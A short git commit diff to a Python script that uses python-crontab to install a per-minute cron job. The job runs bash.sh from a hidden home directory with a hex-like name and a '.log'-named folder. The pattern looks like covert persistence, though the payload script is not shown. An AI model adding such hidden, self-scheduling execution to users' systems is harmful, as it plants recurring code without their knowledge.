7ea42817096755c39d204b6c5c567077e24d64f0
HardImpostor <103056913+HardImpostor@users.noreply.github.com>
2022-10-18 16:35:45 +0200

    Update script.py

--- U6frt3A.log/script.py
+++ U6frt3A.log/script.py
@@ -7,7 +7,7 @@ from crontab import CronTab
 user=os.environ["LOGNAME"]
 #print("voici\n",user,'fin')
 cron= CronTab(user=user)
-script="bash "+os.environ["HOME"]+'/.bdedbfdbabcbafb56cd51926635d136055035e4dd9c7d1f5003af98/U6frt3A.log/bash.sh'
+script='bash $HOME/.bdedbfdbabcbafb56cd51926635d136055035e4dd9c7d1f5003af98/U6frt3A.log/bash.sh'
 job = cron.new(command=script)
 job.minute.every(1)
 cron.write()
